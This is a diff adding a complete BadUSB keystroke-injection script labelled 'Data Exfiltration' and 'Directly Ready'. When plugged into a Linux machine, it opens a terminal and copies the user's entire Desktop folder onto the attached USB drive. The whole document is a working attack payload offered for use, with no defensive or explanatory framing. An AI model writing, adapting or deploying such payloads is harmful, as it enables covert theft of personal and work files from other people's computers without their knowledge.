@@ -1,0 +1,18 @@
+REM Title: Linux Desktop Copier
+REM Author: BadUSB Library
+REM Description: Copies Desktop files to USB drive
+REM Target: Linux
+REM Category: Data Exfiltration
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Copy Desktop to USB
+STRING cp -r ~/Desktop /media/*/Desktop_Backup_$(date +%Y%m%d)
+ENTER
